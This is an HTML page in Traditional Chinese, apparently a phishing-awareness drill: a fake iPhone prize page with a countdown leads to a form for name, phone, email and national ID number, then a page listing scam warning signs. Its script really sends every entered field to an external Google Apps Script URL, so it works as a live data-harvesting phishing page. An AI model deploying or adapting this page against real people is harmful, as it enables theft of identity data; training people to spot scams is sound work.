<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🎉 恭喜您被選中！ - 網路安全教育演練</title>
  <style>
    body {
      font-family: 'Microsoft JhengHei', sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: #333;
      margin: 0;
      padding: 0;
    }
    .education-banner {
      background: #ff4444;
      color: white;
      text-align: center;
      padding: 10px;
      font-weight: bold;
    }
    .container {
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
    }
    .main-card, .form-container, .warning-page {
      background: white;
      border-radius: 20px;
      padding: 30px;
      margin: 20px 0;
      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
      text-align: center;
    }
    .title {
      font-size: 2em;
      color: #ff6b35;
    }
    .subtitle {
      color: #666;
      margin-bottom: 20px;
    }
    .phone-image {
      width: 200px;
      height: 300px;
      margin: 20px auto;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: white;
      border-radius: 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.2em;
    }
    .lucky-button {
      background: #f7931e;
      color: white;
      padding: 15px 30px;
      border: none;
      border-radius: 50px;
      font-size: 1.2em;
      cursor: pointer;
      margin-top: 20px;
    }
    .click-counter {
      margin: 20px 0;
      font-weight: bold;
    }
    .marquee-container {
      background: #333;
      color: white;
      padding: 10px;
      border-radius: 10px;
      overflow: hidden;
    }
    .marquee {
      display: inline-block;
      white-space: nowrap;
      animation: scroll 15s linear infinite;
    }
    @keyframes scroll {
      0% { transform: translateX(100%); }
      100% { transform: translateX(-100%); }
    }
    .form-group {
      margin-bottom: 15px;
      text-align: left;
    }
    .form-group label {
      display: block;
      margin-bottom: 5px;
    }
    .form-group input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 8px;
    }
    .submit-btn, .back-button {
      width: 100%;
      padding: 12px;
      font-size: 1.1em;
      border: none;
      border-radius: 8px;
      margin-top: 10px;
      color: white;
    }
    .submit-btn { background: #28a745; }
    .back-button { background: #007bff; }
  </style>
</head>
<body>
  <div class="education-banner">
    ⚠️ 這是網路安全教育模擬演練網站 - 請勿輸入真實個人資料 ⚠️
  </div>
  <div class="container">
    <div id="homepage" class="main-card">
      <h1 class="title">🎉 恭喜您被選中！</h1>
      <p class="subtitle">您有機會免費獲得全新 iPhone 16 Pro Max！</p>
      <div class="phone-image">📱<br>iPhone 16<br>Pro Max</div>
      <p style="color: #ff6b35; font-size: 1.2em;">⚡ 限時優惠！僅剩 <span id="timer">05:00</span> 分鐘！</p>
      <button class="lucky-button" onclick="clickLucky()">🎁 立即點擊抽獎！</button>
      <div class="click-counter">已有 <span id="clickCount">0</span> 人參與抽獎！</div>
    </div>

    <div class="marquee-container">
      <div class="marquee" id="marqueeText">🎉 尚無中獎名單，快來試試手氣！</div>
    </div>

    <div id="formPage" class="form-container" style="display:none;">
      <h2 style="color: #ff6b35;">填寫資料完成抽獎</h2>
      <form onsubmit="submitForm(event)">
        <div class="form-group">
          <label for="name">姓名：</label>
          <input type="text" id="name" required>
        </div>
        <div class="form-group">
          <label for="phone">手機號碼：</label>
          <input type="tel" id="phone" required>
        </div>
        <div class="form-group">
          <label for="email">電子郵件：</label>
          <input type="email" id="email" required>
        </div>
        <div class="form-group">
          <label for="idcard">身分證字號：</label>
          <input type="text" id="idcard" required>
        </div>
        <button type="submit" class="submit-btn">確認送出</button>
      </form>
    </div>

    <div id="warningPage" class="warning-page" style="display:none;">
      <div style="font-size: 4em; color: #ff4444;">⚠️</div>
      <h2 style="color:#ff4444">停！這是詐騙陷阱！</h2>
      <p>您剛才差點成為網路詐騙的受害者！</p>
      <p><strong>常見詐騙特徵：</strong></p>
      <p>• 聲稱您中獎 • 要求填寫個資 • 限時壓力 • 承諾不實獎品</p>
      <p><strong>記住：</strong>合法抽獎活動不會要求您提供身分證字號！</p>
      <button class="back-button" onclick="goHome()">返回首頁</button>
    </div>
  </div>

  <script>
    const scriptUrl = 'https://script.google.com/macros/s/AKfycbyzQvZYUjfXpIOunFdlR4YZoo5eMWG0iV7mZKb00Eg_OxqTGeTdIssJpHx-GuKxcEE0vw/exec';

    let clickCount = 0;
    let participants = [];

    function clickLucky() {
      clickCount++;
      document.getElementById('clickCount').textContent = clickCount;
      document.getElementById('homepage').style.display = 'none';
      document.getElementById('formPage').style.display = 'block';
    }

    function goHome() {
      document.getElementById('warningPage').style.display = 'none';
      document.getElementById('homepage').style.display = 'block';
      document.getElementById('name').value = '';
      document.getElementById('phone').value = '';
      document.getElementById('email').value = '';
      document.getElementById('idcard').value = '';
    }

    function startTimer() {
      let timeLeft = 300;
      const timer = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        document.getElementById('timer').textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        if (--timeLeft < 0) clearInterval(timer);
      }, 1000);
    }

    async function submitForm(event) {
      event.preventDefault();
      const name = document.getElementById('name').value;
      const phone = document.getElementById('phone').value;
      const email = document.getElementById('email').value;
      const idcard = document.getElementById('idcard').value;

      participants.push({ name, phone, email, idcard });
      updateMarquee();

      const params = new URLSearchParams({ name, phone, email, idcard });

      try {
        await fetch(`${scriptUrl}?${params.toString()}`, {
          method: 'GET',
          mode: 'cors'
        });
      } catch (err) {
        console.error('資料送出失敗：', err);
      }

      alert("⚠️ 資料已記錄（模擬環境請勿輸入真實資訊）");
      document.getElementById('formPage').style.display = 'none';
      document.getElementById('warningPage').style.display = 'block';
    }

    function updateMarquee() {
      const marquee = document.getElementById('marqueeText');
      if (participants.length > 0) {
        const names = participants.map(p => p.name).join('、');
        marquee.textContent = `🎉 ${names} 等 ${participants.length} 位朋友參與了演練！提醒：真正的抽獎不會索取個人敏感資料！`;
      }
    }

    window.onload = function () {
      startTimer();
    }
  </script>
</body>
</html>
